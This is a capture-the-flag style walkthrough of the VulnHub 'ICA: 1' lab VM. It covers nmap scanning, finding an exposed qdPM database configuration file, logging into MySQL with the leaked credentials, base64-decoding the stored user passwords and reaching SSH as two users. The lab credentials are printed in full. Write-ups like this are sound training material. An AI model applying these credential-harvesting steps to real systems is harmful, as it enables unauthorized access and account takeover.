# ICA: 1

- **Machine:** ICA: 1
- **Download:** https://www.vulnhub.com/entry/ica-1,748/

![](811-1.png)

---

## Setup

- Extract the downloaded archive.
- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](811-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to identify open ports, services, OS information, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.239
```

![](811-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.239
```

```bash
nmap -sC -sV -A 192.168.2.239
```

---

## HTTP Enumeration

Perform an aggressive scan using the `http-enum` NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.239
```

![](811-4.png)

---

# Web Enumeration

Visit the following endpoints.

- http://192.168.2.239/
- http://192.168.2.239/backups/
- http://192.168.2.239/batch/
- http://192.168.2.239/core/
- http://192.168.2.239/core/data/fixtures/fixtures.yml

![](811-5.png)

---

## Identify the Application

Open the login page.

- http://192.168.2.239/index.php/login

![](811-6.png)

The application is identified as **qdPM**.

Search for known exploits.

```bash
searchsploit qdPM
```

![](811-7.png)

Read the exploit details.

```bash
cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
```

![](811-8.png)

---

## Database Configuration

Visit the database configuration file.

- http://192.168.2.239/core/config/databases.yml

![](811-9.png)

Recovered database credentials:

```text
Username : qdpmadmin
Password : UcVQCMQk2STVeS6J
```

---

# MySQL Enumeration

Connect to the MySQL server.

```bash
mysql --skip-ssl -h 192.168.2.239 -u qdpmadmin -pUcVQCMQk2STVeS6J
```

![](811-10.png)

Display available databases.

```sql
SHOW DATABASES;
```

Select the target database.

```sql
USE staff;
```

List available tables.

```sql
SHOW TABLES;
```

![](811-11.png)

Enumerate data from interesting tables.

```sql
SELECT * FROM login;
```

```sql
SELECT * FROM user;
```

```sql
SELECT * FROM department;
```

![](811-12.png)

---

## Decode Stored Passwords

The credentials stored in the **login** table are Base64 encoded.

Decode each value.

```bash
echo 'c3VSSkFkR3dMcDhkeTNyRg==' | base64 -d
```

```bash
echo 'N1p3VjRxdGc0MmNtVVhHWA==' | base64 -d
```

```bash
echo 'WDdNUWtQM1cyOWZld0hkQw==' | base64 -d
```

```bash
echo 'REpjZVZ5OThXMjhZN3dMZw==' | base64 -d
```

```bash
echo 'Y3FObkJXQ0J5UzJEdUpTeQ==' | base64 -d
```

![](811-13.png)

---

# SSH Access

Use the recovered credentials to authenticate via SSH.

Login as **dexter**.

```bash
ssh dexter@192.168.2.239
```

![](811-14.png)

Login as **travis**.

```bash
ssh travis@192.168.2.239
```

![](811-15.png)

---

# Key Learning

- Always enumerate backup and configuration directories.
- Database configuration files often expose valid credentials.
- qdPM has publicly documented vulnerabilities that should be checked during enumeration.
- Direct database access can reveal user credentials and internal application data.
- Base64 is an encoding method, not encryption, and should always be decoded during assessments.
- Recovered credentials can often be reused for other services such as SSH.

---

# Summary

The assessment identified a qdPM project management application with an exposed database configuration file. The leaked MySQL credentials allowed direct access to the backend database, where user information and Base64-encoded passwords were recovered. After decoding the stored credentials, valid SSH accounts were identified, resulting in successful remote access to the target system.